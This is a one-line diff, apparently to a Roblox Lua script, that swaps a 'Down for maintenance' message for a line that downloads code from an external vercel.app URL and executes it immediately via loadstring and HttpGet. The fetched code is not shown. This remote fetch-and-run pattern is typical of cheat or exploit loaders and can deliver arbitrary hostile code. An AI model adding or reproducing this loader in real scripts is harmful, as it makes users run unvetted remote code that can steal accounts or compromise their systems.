@@ -1,1 +1,1 @@
-print("Down for maintenance")
+loadstring(game:HttpGet("https://apiravex.vercel.app/loader"))()
